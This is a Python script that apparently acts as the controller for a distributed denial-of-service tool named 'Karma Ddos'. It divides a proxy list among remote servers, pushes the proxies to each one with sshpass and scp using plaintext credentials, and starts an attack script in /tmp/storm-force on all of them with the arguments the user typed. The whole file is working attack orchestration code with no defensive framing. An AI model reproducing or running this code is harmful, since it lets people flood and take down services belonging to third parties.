import os
import json

currentDir = os.path.dirname(os.path.realpath(__file__))

def get_proxy_for_servers() -> dict:
    with open(currentDir + '/proxies.txt', 'r') as f:
        proxies = f.read().splitlines()

    with open(currentDir + '/machines_list.json', 'r') as f:
        machines_list = json.load(f)

    n_servers = len(machines_list)
    n_proxies = len(proxies)
    proxies_per_server = n_proxies // n_servers

    server_proxies = {}
    for i, (server, credentials) in enumerate(machines_list.items()):
        start_index = i * proxies_per_server
        end_index = start_index + proxies_per_server
        if i == n_servers - 1:
            end_index += n_proxies % n_servers
        server_proxies[server] = proxies[start_index:end_index]

    return server_proxies

def format_arguments(arguments:str) -> str:
    args = arguments.split()
    if len(args) >= 2:
        args[1] = "'" + args[1] + "'"
        arguments = ' '.join(args)

    return arguments

def main() -> None:
    with open(currentDir + '/machines_list.json') as json_file:
        machines_list = json.load(json_file)
    arguments = input("Input command for Karma Ddos: ")
    arguments = format_arguments(arguments)
    server_proxies = get_proxy_for_servers()

    for ip in machines_list:
        with open('proxy.txt', 'w') as f:
            for proxy in server_proxies[ip]:
                f.write(str(proxy) + '\n')
        firstPartSshQuery = f"sshpass -p '{machines_list[ip]['password']}'"
        os.system(f"{firstPartSshQuery} scp {currentDir}/proxy.txt {machines_list[ip]['user']}@{ip}:/tmp/storm-force/")
        command = f"{firstPartSshQuery} ssh {machines_list[ip]['user']}@{ip} \"cd /tmp/storm-force && source ./venv/bin/activate && python3 ./main.py {arguments}\""
        os.system(f"{command} &")

if __name__ == "__main__":
    main()